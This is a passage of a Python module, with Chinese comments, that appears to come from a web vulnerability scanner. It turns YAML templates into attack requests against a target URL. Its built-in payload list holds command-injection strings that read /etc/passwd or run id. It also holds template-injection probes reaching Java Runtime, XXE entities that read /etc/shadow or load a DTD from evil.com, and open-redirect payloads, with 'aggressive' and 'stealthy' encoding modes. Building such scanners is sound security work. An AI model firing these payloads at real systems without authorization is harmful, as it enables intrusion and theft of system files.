                "|| id",
                "&& id",
                "& id",
                "`id`",
                "$(id)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; whoami",
                "| whoami",
                "\nid",
                "\r\nid",
                "; sleep 5",
                "| sleep 5",
                "; ping -c 5 127.0.0.1",
            ],
            "stealthy": [
                "; echo test",
                "| echo test",
            ],
        },
        PayloadCategory.SSTI: {
            "default": [
                "{{7*7}}",
                "${7*7}",
            ],
            "aggressive": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "{{config}}",
                "{{self}}",
                "{{''.__class__.__mro__}}",
                "${T(java.lang.Runtime).getRuntime()}",
                "#{T(java.lang.Runtime).getRuntime()}",
                "{{''.__class__.__bases__[0].__subclasses__()}}",
                "${{7*7}}",
                "{% print 7*7 %}",
            ],
            "stealthy": [
                "{{1}}",
                "${1}",
            ],
        },
        PayloadCategory.XXE: {
            "default": [
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            ],
            "aggressive": [
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]>',
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
            ],
            "stealthy": [
                '<?xml version="1.0"?>',
            ],
        },
        PayloadCategory.OPEN_REDIRECT: {
            "default": [
                "//evil.com",
                "https://evil.com",
            ],
            "aggressive": [
                "//evil.com",
                "https://evil.com",
                "http://evil.com",
                "//evil.com/path",
                "https://evil.com/path",
                "http://localhost@evil.com",
                "//evil.com%2f%2f",
                "https:evil.com",
                "https:/evil.com",
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
            ],
            "stealthy": [
                "/",
                "/path",
            ],
        },
    }
    
    def __init__(self, strategy: AttackStrategy = AttackStrategy.DEFAULT,
                 max_variants: int = 10):
        """
        初始化Payload生成器。
        
        Args:
            strategy: 生成策略
            max_variants: 每个payload的最大变体数
        """
        self._strategy = strategy
        self._max_variants = max_variants
        self._custom_payloads: Dict[PayloadCategory, List[str]] = {}
    
    def set_strategy(self, strategy: AttackStrategy) -> None:
        """设置生成策略"""
        self._strategy = strategy
    
    def add_custom_payloads(self, category: PayloadCategory,
                           payloads: List[str]) -> None:
        """
        添加自定义payload。
        
        Args:
            category: payload类别
            payloads: payload列表
        """
        if category not in self._custom_payloads:
            self._custom_payloads[category] = []
        self._custom_payloads[category].extend(payloads)
    
    def generate(self, category: PayloadCategory,
                 custom_payloads: Optional[List[str]] = None,
                 encodings: Optional[List[EncodingMethod]] = None,
                 with_mutations: bool = True) -> List[Payload]:
        """
        生成指定类别的payload列表。
        
        Args:
            category: payload类别
            custom_payloads: 自定义payload列表（覆盖默认）
            encodings: 指定编码方式列表
            with_mutations: 是否生成变异版本
            
        Returns:
            Payload对象列表
        """
        # 确定要使用的payload列表
        if custom_payloads:
            base_payloads = custom_payloads
        else:
            base_payloads = self._get_builtin_payloads(category)
        
        # 确定编码方式
        if encodings is None:
            encodings = self._get_encodings_for_strategy()
        
        # 生成payload对象
        payloads: List[Payload] = []
        
        for base_payload in base_payloads:
            # 生成变体
            variants = [base_payload]
            if with_mutations:
                variants = PayloadMutator.mutate(
                    base_payload, category, self._max_variants
                )
            
            # 应用编码
            for variant in variants:
                for encoding in encodings:
                    encoded = PayloadEncoder.encode(variant, encoding)
                    
                    payload_obj = Payload(
                        original=base_payload,
                        encoded=encoded,
                        category=category,
                        encoding_method=encoding,
                        mutation_type="mutated" if variant != base_payload else "original",
                        risk_level=self._calculate_risk_level(category, variant),
                    )
                    
                    if payload_obj not in payloads:
                        payloads.append(payload_obj)
        
        return payloads
    
    def generate_from_template(self, template_payloads: Dict[str, List[str]]) -> List[Payload]:
        """
        从模板定义生成payload。
        
        Args:
            template_payloads: 模板中的payload_sets定义
            
        Returns:
            Payload对象列表
        """
        strategy_name = self._strategy.value
        payloads: List[Payload] = []
        
        # 优先使用匹配策略的payload
        if strategy_name in template_payloads:
            raw_payloads = template_payloads[strategy_name]
        elif "default" in template_payloads:
            raw_payloads = template_payloads["default"]
        else:
            # 使用第一个可用的策略
            raw_payloads = list(template_payloads.values())[0] if template_payloads else []
        
        for raw in raw_payloads:
            payload_obj = Payload(
                original=str(raw),
                encoded=str(raw),
                category=PayloadCategory.GENERIC,
                source="template",
            )
            payloads.append(payload_obj)
        
        return payloads
    
    def _get_builtin_payloads(self, category: PayloadCategory) -> List[str]:
        """获取内置payload列表"""
        # 优先使用自定义payload
        if category in self._custom_payloads:
            return self._custom_payloads[category]
        
        # 使用内置payload库
        if category in self.BUILTIN_PAYLOADS:
            strategy_name = self._strategy.value
            category_payloads = self.BUILTIN_PAYLOADS[category]
            
            if strategy_name in category_payloads:
                return category_payloads[strategy_name]
            elif "default" in category_payloads:
                return category_payloads["default"]
        
        return self.BUILTIN_PAYLOADS[PayloadCategory.GENERIC]["default"]
    
    def _get_encodings_for_strategy(self) -> List[EncodingMethod]:
        """根据策略获取编码方式列表"""
        if self._strategy == AttackStrategy.AGGRESSIVE:
            return [
                EncodingMethod.NONE,
                EncodingMethod.URL,
                EncodingMethod.DOUBLE_URL,
                EncodingMethod.UNICODE,
            ]
        elif self._strategy == AttackStrategy.STEALTHY:
            return [EncodingMethod.NONE, EncodingMethod.URL]
        else:
            return [EncodingMethod.NONE, EncodingMethod.URL]
    
    def _calculate_risk_level(self, category: PayloadCategory, payload: str) -> int:
        """计算payload风险等级"""
        base_risk = {
            PayloadCategory.SQLI: 4,
            PayloadCategory.XSS: 3,
            PayloadCategory.CMD_INJECTION: 5,
            PayloadCategory.PATH_TRAVERSAL: 3,
            PayloadCategory.LFI: 4,
            PayloadCategory.SSRF: 3,
            PayloadCategory.XXE: 4,
            PayloadCategory.SSTI: 4,
            PayloadCategory.OPEN_REDIRECT: 2,
            PayloadCategory.GENERIC: 1,
        }.get(category, 2)
        
        # 根据payload内容调整
        if "etc/passwd" in payload or "shadow" in payload:
            base_risk = min(5, base_risk + 1)
        if "alert" in payload or "script" in payload:
            base_risk = max(2, base_risk)
        
        return base_risk


# =============================================================================
# 模板渲染器
# =============================================================================

class TemplateRenderer:
    """
    模板渲染器。
    
    负责解析和渲染攻击模板中的变量、路径、请求体等内容。
    
    功能：
        - 变量解析：{{VariableName}}
        - 条件渲染：基于前置条件决定是否渲染
        - 路径拼接：正确处理URL路径
        - 请求体构建：支持多种格式
    
    Example:
        >>> renderer = TemplateRenderer()
        >>> renderer.set_context(base_url="http://example.com")
        >>> url = renderer.render_url("{{BaseURL}}/api?q={{payload}}", {"payload": "test"})
        >>> print(url)
        http://example.com/api?q=test
    """
    
    def __init__(self):
        """初始化模板渲染器"""
        self._variable_resolver = VariableResolver()
        self._render_count = 0
    
    def set_context(self, base_url: str = "", hostname: str = "",
                    port: str = "", scheme: str = "",
                    **kwargs: str) -> None:
        """
        设置渲染上下文变量。
        
        Args:
            base_url: 基础URL
            hostname: 主机名
            port: 端口
            scheme: 协议
            **kwargs: 其他上下文变量
        """
        self._variable_resolver.set_variable("BaseURL", base_url, VariableScope.SESSION)
        self._variable_resolver.set_variable("Hostname", hostname, VariableScope.SESSION)
        self._variable_resolver.set_variable("Port", port, VariableScope.SESSION)
        self._variable_resolver.set_variable("Scheme", scheme, VariableScope.SESSION)
        
        for key, value in kwargs.items():
            self._variable_resolver.set_variable(key, value, VariableScope.SESSION)
    
    def set_variable(self, name: str, value: str,
                     scope: VariableScope = VariableScope.REQUEST) -> None:
        """
        设置单个变量。
        
        Args:
            name: 变量名
            value: 变量值
            scope: 变量作用域
        """
        self._variable_resolver.set_variable(name, value, scope)
    
    def render_url(self, path_template: str, context: Optional[Dict[str, str]] = None,
                   payload: str = "") -> str:
        """
        渲染URL路径模板。
        
        Args:
            path_template: 路径模板
            context: 额外上下文变量
            payload: 当前payload值
            
        Returns:
            渲染后的完整URL
        """
        ctx = context or {}
        if payload:
            ctx["payload"] = payload
        
        rendered = self._variable_resolver.resolve(path_template, ctx)
        
        # 确保URL格式正确
        if rendered.startswith("http://") or rendered.startswith("https://"):
            return rendered
        
        # 处理相对路径
        base_url = self._variable_resolver.get_variable("BaseURL", "")
        if base_url:
            if rendered.startswith("/"):
                return f"{base_url.rstrip('/')}{rendered}"
            else:
                return f"{base_url.rstrip('/')}/{rendered}"
        
        return rendered
    
    def render_body(self, body_template: str, context: Optional[Dict[str, str]] = None,
                    payload: str = "") -> str:
        """
        渲染请求体模板。
        
        Args:
            body_template: 请求体模板
            context: 额外上下文变量
            payload: 当前payload值
            
        Returns:
            渲染后的请求体
        """
        ctx = context or {}
        if payload:
            ctx["payload"] = payload
        
        return self._variable_resolver.resolve(body_template, ctx)
    
    def render_headers(self, headers_template: Dict[str, str],
                       context: Optional[Dict[str, str]] = None,
                       payload: str = "") -> Dict[str, str]:
        """
        渲染请求头模板。
        
        Args:
            headers_template: 请求头模板字典
            context: 额外上下文变量
            payload: 当前payload值
            
        Returns:
            渲染后的请求头字典
        """
        ctx = context or {}
        if payload:
            ctx["payload"] = payload
        
        rendered = {}
        for key, value in headers_template.items():
            rendered[key] = self._variable_resolver.resolve(value, ctx)
        
        return rendered
    
    def check_preconditions(self, preconditions: Dict[str, Any],
                            context: Optional[Dict[str, Any]] = None) -> bool:
        """
        检查前置条件是否满足。
        
        Args:
            preconditions: 前置条件定义
            context: 检查上下文
            
        Returns:
            是否满足所有前置条件
        """
        if not preconditions:
            return True
        
        context = context or {}
        
        # 检查HTTP方法限制
        if "methods" in preconditions:
            allowed_methods = [m.upper() for m in preconditions["methods"]]
            current_method = context.get("method", "GET").upper()
            if current_method not in allowed_methods:
                return False
        
        # 检查响应状态码
        if "status_codes" in preconditions:
            allowed_codes = preconditions["status_codes"]
            current_status = context.get("status_code", 200)
            if current_status not in allowed_codes:
                return False
        
        # 检查响应内容
        if "response_contains" in preconditions:
            required_content = preconditions["response_contains"]
            response_body = context.get("response_body", "")
            if required_content not in response_body:
                return False
        
        # 检查响应头
        if "response_headers" in preconditions:
            required_headers = preconditions["response_headers"]
            response_headers = context.get("response_headers", {})
            for key, value in required_headers.items():
                if key not in response_headers or value not in response_headers[key]:
                    return False
        
        return True
    
    def get_render_count(self) -> int:
        """获取渲染次数"""
        return self._render_count
    
    def reset_render_count(self) -> None:
        """重置渲染计数"""
        self._render_count = 0


# =============================================================================
# 攻击脚本构建器
# =============================================================================

class AttackScriptBuilder:
    """
    攻击脚本构建器。
    
    核心类，负责将模板、payload、上下文组合生成完整的攻击脚本。
    
    主要功能：
        1. 从模板构建攻击脚本
        2. 智能payload生成与编码
        3. 请求构建与变量渲染
        4. 匹配器配置
    
    使用流程：
        1. 创建构建器实例
        2. 设置策略和上下文
        3. 调用build_from_plugin或build_from_template
        4. 获取生成的攻击脚本列表
    
    Example:
        >>> builder = AttackScriptBuilder(strategy=AttackStrategy.DEFAULT)
        >>> builder.set_target("http://example.com")
        >>> scripts = builder.build_from_plugin(plugin_data)
        >>> for script in scripts:
        ...     print(script.request.url, script.payload.original)
    """
    
    def __init__(self, strategy: AttackStrategy = AttackStrategy.DEFAULT,
                 max_payloads: int = 20):
        """
        初始化攻击脚本构建器。
        
        Args:
            strategy: 生成策略
            max_payloads: 最大payload数量限制
        """
        self._strategy = strategy
        self._max_payloads = max_payloads
        
        self._renderer = TemplateRenderer()
        self._payload_generator = PayloadGenerator(strategy, max_payloads // 2)
        
        self._target_url: str = ""
        self._context: Dict[str, Any] = {}
        self._script_id_counter = 0
    
    def set_strategy(self, strategy: AttackStrategy) -> "AttackScriptBuilder":
        """
        设置攻击策略。
        
        Args:
            strategy: 策略类型
            
        Returns:
            self（支持链式调用）
        """
        self._strategy = strategy
        self._payload_generator.set_strategy(strategy)
        return self
    
    def set_target(self, base_url: str) -> "AttackScriptBuilder":
        """
        设置目标URL。
        
        Args:
            base_url: 基础目标URL
            
        Returns:
            self（支持链式调用）
        """
        self._target_url = base_url.rstrip("/")
        
        # 解析URL组件
        parsed = urllib.parse.urlparse(base_url)
        self._renderer.set_context(
            base_url=self._target_url,
            hostname=parsed.hostname or "",
            port=str(parsed.port) if parsed.port else ("443" if parsed.scheme == "https" else "80"),
            scheme=parsed.scheme or "http",
        )
        
        return self
    
    def set_context(self, **kwargs: Any) -> "AttackScriptBuilder":
        """
        设置额外上下文变量。
        
        Args:
            **kwargs: 上下文变量键值对
            
        Returns:
            self（支持链式调用）
        """
        self._context.update(kwargs)
        
        for key, value in kwargs.items():
            if isinstance(value, str):
                self._renderer.set_variable(key, value)
        
        return self
    
    def build_from_plugin(self, plugin: Dict[str, Any],
                          extra_payloads: Optional[List[str]] = None) -> List[AttackScript]:
        """
        从插件定义构建攻击脚本。
        
        这是主要的构建方法，处理完整的插件YAML定义。
        
        Args:
            plugin: 插件配置字典（从YAML解析）
            extra_payloads: 额外的自定义payload
            
        Returns:
            攻击脚本列表
            
        Notes:
            生成流程：
            1. 解析插件基本信息
            2. 遍历所有请求定义
            3. 为每个请求生成payload变体
            4. 渲染模板变量
            5. 构建完整的攻击脚本对象
        """
        scripts: List[AttackScript] = []
        
        # 获取插件基本信息
        plugin_id = plugin.get("id", "unknown")
        plugin_info = plugin.get("info", {})
        severity = plugin_info.get("severity", "medium")
        vuln_type = plugin_info.get("name", plugin_id)
        
        # 获取payload类别
        category = self._detect_payload_category(plugin)
        
        # 遍历所有请求定义
        for req_idx, request_def in enumerate(plugin.get("requests", [])):
            # 检查前置条件
            preconditions = request_def.get("preconditions", {})
            if not self._renderer.check_preconditions(preconditions, self._context):
                continue
            
            # 获取或生成payload
            payloads = self._get_payloads(request_def, category, extra_payloads)
            
            # 获取路径模板
            path_templates = request_def.get("path", [])
            if isinstance(path_templates, str):
                path_templates = [path_templates]
            
            # 为每个payload和路径组合生成脚本
            for payload_obj in payloads:
                for path_template in path_templates:
                    script = self._build_single_script(
                        plugin_id=plugin_id,
                        request_def=request_def,
                        path_template=path_template,
                        payload=payload_obj,
                        req_idx=req_idx,
                        vuln_type=vuln_type,
                        severity=severity,
                    )
                    scripts.append(script)
                    
                    if len(scripts) >= self._max_payloads:
                        return scripts
        
        return scripts
    
    def build_from_template(self, template: Template,
                           payloads: Optional[List[Payload]] = None) -> List[AttackScript]:
        """
        从模板对象构建攻击脚本。
        
        Args:
            template: 模板对象
            payloads: 可选的payload列表
            
        Returns:
            攻击脚本列表
        """
        # 转换模板为插件格式
        plugin_dict = {
            "id": template.id,
            "info": template.info,
            "requests": template.requests,
        }
        
        return self.build_from_plugin(plugin_dict)
    
    def build_single_request(self, method: str, url: str,
                             payload: str = "",
                             headers: Optional[Dict[str, str]] = None,
                             body: Optional[str] = None,
                             matchers: Optional[List[Dict[str, Any]]] = None) -> AttackScript:
        """
        构建单个攻击请求脚本。
        
        便捷方法，用于快速构建简单攻击脚本。
        
        Args:
            method: HTTP方法
            url: 完整URL
            payload: payload值
            headers: 请求头
            body: 请求体
            matchers: 匹配器列表
            
        Returns:
            攻击脚本对象
        """
        self._script_id_counter += 1
        
        request = AttackRequest(
            url=url,
            method=method.upper(),
            headers=headers or {},
            body=body,
        )
        
        payload_obj = Payload(
            original=payload,
            encoded=payload,
            category=PayloadCategory.GENERIC,
        )
        
        return AttackScript(
            id=f"script_{self._script_id_counter:06d}",
            request=request,
            payload=payload_obj,
            matchers=matchers or [],
        )
    
    def _get_payloads(self, request_def: Dict[str, Any],
                      category: PayloadCategory,
                      extra_payloads: Optional[List[str]] = None) -> List[Payload]:
        """
        获取payload列表。
        
        优先级：
        1. 请求定义中的payload_sets
        2. 额外提供的payload
        3. 根据类别生成的默认payload
        """
        # 检查请求定义中的payload_sets
        if "payload_sets" in request_def:
            payloads = self._payload_generator.generate_from_template(
                request_def["payload_sets"]
            )
            if payloads:
                return payloads
        
        # 使用额外payload或生成
        if extra_payloads:
            return self._payload_generator.generate(
                category, custom_payloads=extra_payloads
            )
        
        return self._payload_generator.generate(category)
    
    def _build_single_script(self, plugin_id: str,
                              request_def: Dict[str, Any],
                              path_template: str,
                              payload: Payload,
                              req_idx: int,
                              vuln_type: str,
                              severity: str) -> AttackScript:
        """
        构建单个攻击脚本。
        """
        self._script_id_counter += 1
        
        # 渲染URL
        url = self._renderer.render_url(path_template, payload=payload.encoded)
        
        # 渲染请求头
        headers_template = request_def.get("headers", {})
        headers = self._renderer.render_headers(headers_template, payload=payload.encoded)
        
        # 渲染请求体
        body = None
        if "body" in request_def:
            body = self._renderer.render_body(request_def["body"], payload=payload.encoded)
        
        # 构建请求对象
        request = AttackRequest(
            url=url,
            method=request_def.get("method", "GET").upper(),
            headers=headers,
            body=body,
            metadata={
                "path_template": path_template,
                "request_index": req_idx,
            },
        )
        
        # 构建脚本对象
        script = AttackScript(
            id=f"{plugin_id}_{req_idx}_{self._script_id_counter:04d}",
            request=request,
            payload=payload,
            matchers=request_def.get("matchers", []),
            extractors=request_def.get("extractors", []),
            plugin_id=plugin_id,
            vulnerability_type=vuln_type,
            severity=severity,
            description=f"Generated from plugin: {plugin_id}",
            context=self._context.copy(),
        )
        
        return script
    
    def _detect_payload_category(self, plugin: Dict[str, Any]) -> PayloadCategory:
        """
        根据插件信息检测payload类别。
        
        通过分析插件ID、名称、标签等信息判断。
        """
        plugin_id = plugin.get("id", "").lower()
        plugin_info = plugin.get("info", {})
        plugin_name = plugin_info.get("name", "").lower()
        tags = [t.lower() for t in plugin_info.get("tags", [])]
        
        # 关键词映射
        keyword_map = {
            PayloadCategory.SQLI: ["sqli", "sql", "injection", "sql injection"],
            PayloadCategory.XSS: ["xss", "cross-site", "script"],
            PayloadCategory.PATH_TRAVERSAL: ["traversal", "path", "directory"],
            PayloadCategory.LFI: ["lfi", "local file", "file inclusion"],
            PayloadCategory.RFI: ["rfi", "remote file"],
            PayloadCategory.SSRF: ["ssrf", "server-side request"],
            PayloadCategory.XXE: ["xxe", "xml entity"],
            PayloadCategory.CMD_INJECTION: ["cmd", "command", "rce", "exec", "os"],
            PayloadCategory.SSTI: ["ssti", "template", "jinja", "twig"],
            PayloadCategory.OPEN_REDIRECT: ["redirect", "open redirect"],
        }
        
        # 检查ID、名称和标签
        all_text = f"{plugin_id} {plugin_name} {' '.join(tags)}"
        
        for category, keywords in keyword_map.items():
            if any(kw in all_text for kw in keywords):
                return category
        
        return PayloadCategory.GENERIC
    
    def get_statistics(self) -> Dict[str, Any]:
        """
        获取构建统计信息。
        
        Returns:
            统计信息字典
        """
        return {
            "strategy": self._strategy.value,
            "target_url": self._target_url,
            "scripts_generated": self._script_id_counter,
            "render_count": self._renderer.get_render_count(),
        }


# =============================================================================
# 模板管理器
# =============================================================================

class TemplateManager:
    """
    模板管理器。
    
    负责模板的加载、缓存、验证和管理。
    
    功能：
        - 从文件系统加载YAML/JSON模板
        - 模板缓存机制
        - 模板验证
        - 模板搜索和查询
    
    Example:
        >>> manager = TemplateManager()
        >>> manager.load_directory("./plugins/vulnerabilities")
        >>> templates = manager.get_templates_by_category("xss")
        >>> for t in templates:
        ...     print(t.id, t.get_severity())
    """
    
    def __init__(self, cache_enabled: bool = True):
        """
        初始化模板管理器。
        
        Args:
            cache_enabled: 是否启用缓存
        """
        self._templates: Dict[str, Template] = {}
        self._cache_enabled = cache_enabled
        self._loaded_paths: Set[str] = set()
    
    def load_file(self, file_path: str) -> Optional[Template]:
        """
        从文件加载模板。
        
        Args:
            file_path: 模板文件路径
            
        Returns:
            加载的模板对象，失败返回None
        """
        if not os.path.exists(file_path):
            logger.warning(f"模板文件不存在: {file_path}")
            return None
        
        # 检查缓存
        if self._cache_enabled and file_path in self._loaded_paths:
            file_mtime = os.path.getmtime(file_path)
            cached_template = self._templates.get(file_path)
            if cached_template and hasattr(cached_template, '_mtime'):
                if cached_template._mtime >= file_mtime:
                    return cached_template
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # 根据文件扩展名解析
            ext = os.path.splitext(file_path)[1].lower()
            if ext in ['.yaml', '.yml']:
                if not YAML_AVAILABLE:
                    logger.error("YAML库不可用，无法解析YAML模板")
                    return None
                data = yaml.safe_load(content)
            elif ext == '.json':
                data = json.loads(content)
            else:
                logger.warning(f"不支持的模板格式: {ext}")
                return None
            
            # 构建模板对象
            template = self._build_template(data, file_path)
            
            if template:
                self._templates[template.id] = template
                self._loaded_paths.add(file_path)
                setattr(template, '_mtime', os.path.getmtime(file_path))
            
            return template
            
        except Exception as e:
            logger.error(f"加载模板失败 {file_path}: {e}")
            return None
    
    def load_directory(self, dir_path: str, recursive: bool = True) -> int:
        """
        从目录加载所有模板。
        
        Args:
            dir_path: 目录路径
            recursive: 是否递归加载
            
        Returns:
            加载的模板数量
        """
        if not os.path.isdir(dir_path):
            logger.warning(f"目录不存在: {dir_path}")
            return 0
        
        count = 0
        pattern = '**/*' if recursive else '*'
        
        for ext in ['*.yaml', '*.yml', '*.json']:
            for file_path in Path(dir_path).glob(f"{pattern}/{ext}" if recursive else ext):
                template = self.load_file(str(file_path))
                if template:
                    count += 1
        
        logger.info(f"从目录 {dir_path} 加载了 {count} 个模板")
        return count
    
    def get_template(self, template_id: str) -> Optional[Template]:
        """
        根据ID获取模板。
        
        Args:
            template_id: 模板ID
            
        Returns:
            模板对象或None
        """
        return self._templates.get(template_id)
    
    def get_all_templates(self) -> List[Template]:
        """
        获取所有模板。
        
        Returns:
            模板列表
        """
        return list(self._templates.values())
    
    def get_templates_by_category(self, category: str) -> List[Template]:
        """
        根据类别获取模板。
        
        Args:
            category: 类别关键词
            
        Returns:
            匹配的模板列表
        """
        category_lower = category.lower()
        return [
            t for t in self._templates.values()
            if category_lower in t.id.lower() or
               category_lower in t.info.get("name", "").lower() or
               any(category_lower in tag.lower() for tag in t.info.get("tags", []))
        ]
    
    def get_templates_by_severity(self, severity: str) -> List[Template]:
        """
        根据严重程度获取模板。
        
        Args:
            severity: 严重程度 (critical/high/medium/low/info)
            
        Returns:
            匹配的模板列表
        """
        severity_lower = severity.lower()
        return [
            t for t in self._templates.values()
            if t.get_severity() == severity_lower
        ]
    
    def search_templates(self, query: str) -> List[Template]:
        """
        搜索模板。
        
        Args:
            query: 搜索查询
            
        Returns:
            匹配的模板列表
        """
        query_lower = query.lower()
        results = []
        
        for template in self._templates.values():
            # 搜索ID
            if query_lower in template.id.lower():
                results.append(template)
                continue
            
            # 搜索名称
            if query_lower in template.info.get("name", "").lower():
                results.append(template)
                continue
            
            # 搜索描述
            if query_lower in template.info.get("description", "").lower():
                results.append(template)
                continue
            
            # 搜索标签
            if any(query_lower in tag.lower() for tag in template.info.get("tags", [])):
                results.append(template)
                continue
        
        return results
    
    def _build_template(self, data: Dict[str, Any], source_path: str) -> Optional[Template]:
        """
        从解析的数据构建模板对象。
        
        Args:
            data: 解析后的数据字典
            source_path: 源文件路径
            
        Returns:
            模板对象或None
        """
        if not data or "id" not in data:
            return None
        
        # 构建变量对象
        variables = {}
        for var_name, var_def in data.get("variables", {}).items():
            if isinstance(var_def, str):
                variables[var_name] = TemplateVariable(name=var_name, value=var_def)
            elif isinstance(var_def, dict):
                variables[var_name] = TemplateVariable(
                    name=var_name,
                    value=var_def.get("value", ""),
                    description=var_def.get("description", ""),
                    default_value=var_def.get("default"),
                )
        
        return Template(
            id=data["id"],
            info=data.get("info", {}),
            requests=data.get("requests", []),
            variables=variables,
            imports=data.get("imports", []),
            metadata=data.get("metadata", {}),
            source_path=source_path,
        )
    
    def clear_cache(self) -> None:
        """清除缓存"""
        self._templates.clear()
        self._loaded_paths.clear()
    
    def get_template_count(self) -> int:
        """获取模板数量"""
        return len(self._templates)


# =============================================================================
# 批量生成器
# =============================================================================

class BatchScriptGenerator:
    """
    批量攻击脚本生成器。
    
    支持从多个模板批量生成攻击脚本，优化性能和内存使用。
    
    Example:
        >>> generator = BatchScriptGenerator()
        >>> generator.set_target("http://example.com")
        >>> generator.load_templates("./plugins")
        >>> scripts = generator.generate_all()
    """
    
    def __init__(self, strategy: AttackStrategy = AttackStrategy.DEFAULT,
                 max_scripts_per_template: int = 50):
        """
        初始化批量生成器。
        
        Args:
            strategy: 生成策略
            max_scripts_per_template: 每个模板的最大脚本数
        """
        self._strategy = strategy
        self._max_scripts = max_scripts_per_template
        
        self._template_manager = TemplateManager()
        self._builder = AttackScriptBuilder(strategy, max_scripts_per_template)
        
        self._target_url = ""
        self._global_context: Dict[str, Any] = {}
    
    def set_target(self, base_url: str) -> "BatchScriptGenerator":
        """
        设置目标URL。
        
        Args:
            base_url: 基础目标URL
            
        Returns:
            self（支持链式调用）
        """
        self._target_url = base_url
        self._builder.set_target(base_url)
        return self
    
    def set_context(self, **kwargs: Any) -> "BatchScriptGenerator":
        """
        设置全局上下文。
        
        Args:
            **kwargs: 上下文变量
            
        Returns:
            self（支持链式调用）
        """
        self._global_context.update(kwargs)
        self._builder.set_context(**kwargs)
        return self
    
    def load_templates(self, path: str) -> int:
        """
        加载模板。
        
        Args:
            path: 模板目录或文件路径
            
        Returns:
            加载的模板数量
        """
        if os.path.isdir(path):
            return self._template_manager.load_directory(path)
        elif os.path.isfile(path):
            template = self._template_manager.load_file(path)
            return 1 if template else 0
        return 0
    
    def generate_all(self) -> Generator[AttackScript, None, None]:
        """
        生成所有攻击脚本（生成器模式）。
        
        Yields:
            攻击脚本对象
            
        Notes:
            使用生成器模式减少内存占用
        """
        for template in self._template_manager.get_all_templates():
            scripts = self._builder.build_from_template(template)
            for script in scripts:
                yield script
    
    def generate_for_template(self, template_id: str) -> List[AttackScript]:
        """
        为指定模板生成脚本。
        
        Args:
            template_id: 模板ID
            
        Returns:
            攻击脚本列表
        """
        template = self._template_manager.get_template(template_id)
        if not template:
            return []
        
        return self._builder.build_from_template(template)
    
    def generate_for_category(self, category: str) -> Generator[AttackScript, None, None]:
        """
        为指定类别的模板生成脚本。
        
        Args:
            category: 类别关键词
            
        Yields:
            攻击脚本对象
        """
        templates = self._template_manager.get_templates_by_category(category)
        for template in templates:
            scripts = self._builder.build_from_template(template)
            for script in scripts:
                yield script
    
    def get_statistics(self) -> Dict[str, Any]:
        """
        获取生成统计信息。
        
        Returns:
            统计信息字典
        """
        return {
            "target_url": self._target_url,
            "strategy": self._strategy.value,
            "template_count": self._template_manager.get_template_count(),
            "builder_stats": self._builder.get_statistics(),
        }


# =============================================================================
# 便捷函数
# =============================================================================

def create_script_builder(strategy: str = "default") -> AttackScriptBuilder:
    """
    创建攻击脚本构建器的便捷函数。
    
    Args:
        strategy: 策略名称 (default/aggressive/stealthy)
        
    Returns:
        配置好的AttackScriptBuilder实例
    """
    strategy_map = {
        "default": AttackStrategy.DEFAULT,
        "aggressive": AttackStrategy.AGGRESSIVE,
        "stealthy": AttackStrategy.STEALTHY,
    }
    
    return AttackScriptBuilder(strategy=strategy_map.get(strategy, AttackStrategy.DEFAULT))


def generate_attack_scripts(plugin: Dict[str, Any], target_url: str,
                            strategy: str = "default",
                            max_scripts: int = 50) -> List[AttackScript]:
    """
    快速生成攻击脚本的便捷函数。
    
    Args:
        plugin: 插件配置
        target_url: 目标URL
        strategy: 生成策略
        max_scripts: 最大脚本数
        
    Returns:
        攻击脚本列表
        
    Example:
        >>> plugin = {"id": "xss-test", "requests": [...]}
        >>> scripts = generate_attack_scripts(plugin, "http://example.com", "default")
        >>> for s in scripts:
        ...     print(s.id, s.request.url)
    """
    builder = create_script_builder(strategy)
    builder.set_target(target_url)
    return builder.build_from_plugin(plugin)


def load_and_generate(template_path: str, target_url: str,
                      strategy: str = "default") -> List[AttackScript]:
    """
    从模板文件加载并生成攻击脚本。
    
    Args:
        template_path: 模板文件路径
        target_url: 目标URL
        strategy: 生成策略
        
    Returns:
        攻击脚本列表
    """
    manager = TemplateManager()
    template = manager.load_file(template_path)
    
    if not template:
        return []
    
    builder = create_script_builder(strategy)
    builder.set_target(target_url)
    
    return builder.build_from_template(template)


# =============================================================================
# 模块导出
# =============================================================================

__all__ = [
    # 枚举类型
    "AttackStrategy",
    "PayloadCategory",
    "EncodingMethod",
    "VariableScope",
    
    # 数据实体
    "Payload",
    "AttackRequest",
    "AttackScript",
    "TemplateVariable",
    "Template",
    
    # 核心类
    "VariableResolver",
    "PayloadEncoder",
    "PayloadMutator",
    "PayloadGenerator",
    "TemplateRenderer",
    "AttackScriptBuilder",
    "TemplateManager",
    "BatchScriptGenerator",
    
    # 便捷函数
    "create_script_builder",
    "generate_attack_scripts",
    "load_and_generate",
]